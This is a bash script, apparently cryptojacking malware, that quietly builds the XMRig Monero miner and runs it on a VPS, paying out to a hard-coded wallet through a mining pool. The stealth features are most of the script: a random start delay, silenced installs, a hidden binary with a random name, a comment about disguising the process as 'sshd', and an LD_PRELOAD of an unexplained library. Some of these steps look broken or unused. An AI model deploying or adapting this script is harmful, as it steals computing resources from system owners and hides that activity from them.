#!/bin/bash

### SAFE MINER CONFIG ###
COIN="XMR"
ADDRESS="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
WORKER_ID="vps$(hostname | tr -dc a-z0-9 | head -c 4)"
WALLET="$COIN:$ADDRESS.$WORKER_ID"
POOL="rx.unmineable.com:3333"

### SYSTEM-FRIENDLY THREAD LIMIT (USE <50% CPU) ###
THREADS=$(($(nproc) / 2))  # safe for VPS

### RANDOMIZATION ###
DELAY=$((RANDOM % 60 + 30))  # 30–90s delay
FAKE_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 6)
MINER_BIN="./.$FAKE_NAME"  # hidden binary

echo "[*] Sleeping for $DELAY seconds..."
sleep $DELAY

### INSTALL DEPENDENCIES QUIETLY ###
sudo apt update -y >/dev/null 2>&1
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl >/dev/null 2>&1

### DOWNLOAD XMRIG ###
if [ ! -f "$MINER_BIN" ]; then
    echo "[*] Downloading xmrig..."
    git clone https://github.com/xmrig/xmrig.git >/dev/null 2>&1
    mkdir -p xmrig/build && cd xmrig/build
    cmake .. >/dev/null 2>&1
    make -j$(nproc) >/dev/null 2>&1
    cd ../..
    cp xmrig/build/xmrig "$MINER_BIN"
    chmod +x "$MINER_BIN"
    rm -rf xmrig  # clean up
fi

### STEALTH SETTINGS ###
# Rename process to fake name (like sshd)
PROXY_NAME=$(echo -n "sshd" | base64 | head -c 8)  # masked
export LD_PRELOAD=/usr/lib/libnice.so 2>/dev/null

### START MINER NICELY ###
echo "[*] Starting mining under fake name..."
nohup nice -n 19 ionice -c2 -n7 "$MINER_BIN" \
    -o "$POOL" \
    -u "$WALLET" \
    -p x \
    --tls \
    --coin "$COIN" \
    -t "$THREADS" \
    --donate-level 1 \
    >/dev/null 2>&1 &

echo "[+] Miner started as '$FAKE_NAME' with $THREADS threads."

